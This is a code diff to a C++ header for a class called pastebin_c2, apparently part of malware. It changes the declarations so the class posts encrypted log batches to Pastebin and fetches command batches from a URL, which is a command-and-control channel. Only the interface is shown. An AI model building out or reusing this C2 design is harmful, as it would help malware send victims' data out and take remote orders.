@@ -3,18 +3,19 @@
 
 #include "comm.h"
 #include "crypto.h"
+#include "protocol.h"
 #include <string>
+#include <vector>
 
 class pastebin_c2 {
 public:
     pastebin_c2(Comm* comm_module, crypto_encoder* encoder);
     
-    // Posts encrypted data to a pastebin-like service
-    // Returns the raw response (which might be a confirmation or link)
-    std::string post_data(const std::string& data);
+    // Posts a log batch to Pastebin
+    std::string post_logs(const LogBatch& logs);
 
-    // Fetches data from a URL (e.g., a raw paste link) and decrypts it
-    std::string fetch_data(const std::wstring& url);
+    // Fetches and parses a command batch from a URL
+    CommandBatch fetch_commands(const std::wstring& url);
 
     // Syncs time from the server headers
     void sync_time();
